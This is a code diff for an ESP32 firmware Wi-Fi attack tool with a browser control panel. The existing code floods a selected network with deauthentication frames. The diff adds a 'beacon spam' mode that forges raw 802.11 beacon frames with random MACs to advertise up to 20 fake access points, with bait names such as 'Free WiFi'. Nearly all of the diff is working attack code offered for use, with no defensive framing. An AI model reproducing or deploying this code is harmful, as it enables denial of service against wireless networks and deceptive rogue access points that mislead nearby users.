@@ -28,6 +28,13 @@ uint8_t targetBSSID[6];
 int targetChannel = 1;
 volatile unsigned long packetsSent = 0;
 
+// --- Beacon spam ---
+#define MAX_BEACON_SSIDS 20
+String beaconSSIDs[MAX_BEACON_SSIDS];
+int beaconCount = 0;
+bool beaconing = false;
+uint8_t beaconChannel = 1;
+
 void sendDeauth(const uint8_t* bssid, int count = 5) {
   uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   memcpy(&deauthFrame[4], broadcast, 6);
@@ -38,6 +45,44 @@ void sendDeauth(const uint8_t* bssid, int count = 5) {
     packetsSent++;
     delay(20);
   }
+}
+
+// Build and transmit one 802.11 beacon frame advertising the given SSID.
+// Uses a randomized locally-administered MAC as the fake AP's BSSID.
+void sendBeacon(const char* ssid) {
+  uint8_t len = strlen(ssid);
+  if (len > 32) len = 32;
+
+  uint8_t pkt[128];
+  int i = 0;
+
+  // MAC header: Frame Control (beacon, subtype 8) + duration + broadcast dest
+  const uint8_t hdr[] = {0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  memcpy(pkt + i, hdr, sizeof(hdr)); i += sizeof(hdr);
+
+  // Source + BSSID: random locally-administered MAC (bit 1 of first octet set)
+  uint8_t mac[6] = {0x02, 0x00, 0x00, (uint8_t)random(256), (uint8_t)random(256), (uint8_t)random(256)};
+  memcpy(pkt + i, mac, 6); i += 6;   // Addr2 (source)
+  memcpy(pkt + i, mac, 6); i += 6;   // Addr3 (BSSID)
+
+  pkt[i++] = 0x00; pkt[i++] = 0x00;  // sequence/fragment (set by hardware)
+
+  // Fixed parameters
+  for (int t = 0; t < 8; t++) pkt[i++] = 0x00;  // timestamp
+  pkt[i++] = 0x64; pkt[i++] = 0x00;             // beacon interval (100 TU)
+  pkt[i++] = 0x01; pkt[i++] = 0x04;             // capability info (ESS, open)
+
+  // Tagged parameters
+  pkt[i++] = 0x00; pkt[i++] = len;              // SSID element
+  memcpy(pkt + i, ssid, len); i += len;
+
+  const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
+  memcpy(pkt + i, rates, sizeof(rates)); i += sizeof(rates);  // supported rates
+
+  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = beaconChannel; // DS parameter (channel)
+
+  esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false);
+  packetsSent++;
 }
 
 String macToStr(const uint8_t* mac) {
@@ -129,6 +174,18 @@ label.auto{font-size:12px;color:var(--muted);display:flex;align-items:center;gap
 .stat .cnt{margin-left:auto;font-family:ui-monospace,Consolas,monospace;color:var(--txt)}
 .stat .cnt b{color:var(--accent)}
 .dock .row{display:flex;gap:8px}
+.section{margin-top:22px;padding-top:18px;border-top:1px solid var(--line)}
+.section h2{font-size:15px;margin:0 0 4px}
+.section p.sub{margin:0 0 10px;font-size:12px;color:var(--muted)}
+textarea{
+  width:100%;min-height:96px;resize:vertical;background:var(--panel);
+  border:1px solid var(--line);border-radius:10px;color:var(--txt);
+  padding:10px 12px;font-size:13px;font-family:ui-monospace,Consolas,monospace;
+  margin-bottom:8px
+}
+textarea:focus{outline:none;border-color:var(--accent)}
+.btn.warnbtn{background:rgba(245,158,11,.15);border-color:rgba(245,158,11,.4);color:#fcd34d}
+.badge{font-size:11px;color:var(--warn);margin-left:8px}
 </style></head><body>
 <div class="wrap">
   <header>
@@ -144,6 +201,16 @@ label.auto{font-size:12px;color:var(--muted);display:flex;align-items:center;gap
     <label class="auto"><input type="checkbox" id="auto"> auto</label>
   </div>
   <div id="networks"><div class="empty">Tap &ldquo;Scan networks&rdquo; to begin.</div></div>
+
+  <div class="section">
+    <h2>Beacon spam <span class="badge" id="beaconBadge"></span></h2>
+    <p class="sub">Broadcast fake access points &mdash; one SSID per line (max 20).</p>
+    <textarea id="ssids" placeholder="Free WiFi&#10;Definitely Not A Trap&#10;ESP32 Test AP"></textarea>
+    <div class="row">
+      <button class="btn warnbtn grow" id="beaconBtn" onclick="startBeacon()">Start beacons</button>
+      <button class="btn grow" id="beaconStopBtn" onclick="stopBeacon()" disabled>Stop</button>
+    </div>
+  </div>
 </div>
 
 <div class="dock"><div class="in">
@@ -206,13 +273,23 @@ function start(){
 }
 function stop(){ fetch('/stop').then(poll); }
 
+function startBeacon(){
+  const list=$('ssids').value;
+  if(!list.trim()){alert('Enter at least one SSID');return;}
+  fetch('/beacon',{method:'POST',headers:{'Content-Type':'text/plain'},body:list}).then(poll);
+}
+function stopBeacon(){ fetch('/beacon/stop').then(poll); }
+
 function render(s){
-  const live=s.attacking;
-  $('pill').className='pill '+(live?'live':'idle');
-  $('pillTxt').textContent=live?'Deauthing':'Idle';
+  const live=s.attacking, bcn=s.beaconing;
+  $('pill').className='pill '+((live||bcn)?'live':'idle');
+  $('pillTxt').textContent=live?'Deauthing':bcn?'Beaconing':'Idle';
   $('pkts').textContent=s.packets.toLocaleString();
   $('stopBtn').disabled=!live;
-  $('startBtn').disabled=live||!selected;
+  $('startBtn').disabled=live||bcn||!selected;
+  $('beaconStopBtn').disabled=!bcn;
+  $('beaconBtn').disabled=bcn;
+  $('beaconBadge').textContent=bcn?('broadcasting '+s.beaconCount+' SSIDs'):'';
 }
 function poll(){ fetch('/status').then(r=>r.json()).then(render).catch(()=>{}); }
 
@@ -260,9 +337,34 @@ void handleStop() {
   server.send(200, "text/plain", "stopped");
 }
 
+void handleBeacon() {
+  // Body is a newline-separated list of SSIDs to broadcast.
+  String body = server.arg("plain");
+  beaconing = false;      // pause while we rebuild the list
+  beaconCount = 0;
+  int start = 0;
+  while (start <= body.length() && beaconCount < MAX_BEACON_SSIDS) {
+    int nl = body.indexOf('\n', start);
+    if (nl < 0) nl = body.length();
+    String s = body.substring(start, nl);
+    s.trim();
+    if (s.length() > 0) beaconSSIDs[beaconCount++] = s;
+    start = nl + 1;
+  }
+  beaconing = (beaconCount > 0);
+  server.send(200, "text/plain", beaconing ? "started" : "no ssids");
+}
+
+void handleBeaconStop() {
+  beaconing = false;
+  server.send(200, "text/plain", "stopped");
+}
+
 void handleStatus() {
   String json = "{";
   json += "\"attacking\":" + String(attacking ? "true" : "false") + ",";
+  json += "\"beaconing\":" + String(beaconing ? "true" : "false") + ",";
+  json += "\"beaconCount\":" + String(beaconCount) + ",";
   json += "\"packets\":" + String(packetsSent) + ",";
   json += "\"channel\":" + String(targetChannel) + ",";
   json += "\"bssid\":\"" + macToStr(targetBSSID) + "\"}";
@@ -270,7 +372,7 @@ void handleStatus() {
 }
 
 void setup() {
-  Serial.begin(115200);
+  Serial.begin(9600);
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(controlSSID, controlPass);
   Serial.print("Control panel at: http://");
@@ -281,13 +383,20 @@ void setup() {
   server.on("/attack", handleAttack);
   server.on("/stop", handleStop);
   server.on("/status", handleStatus);
+  server.on("/beacon", HTTP_POST, handleBeacon);
+  server.on("/beacon/stop", handleBeaconStop);
   server.begin();
 }
 
 void loop() {
   server.handleClient();
   esp_wifi_set_promiscuous(true);
-  if (attacking) {
+  if (beaconing) {
+    for (int i = 0; i < beaconCount; i++) {
+      sendBeacon(beaconSSIDs[i].c_str());
+    }
+    delay(100);
+  } else if (attacking) {
     sendDeauth(targetBSSID, 3);
   }
 }
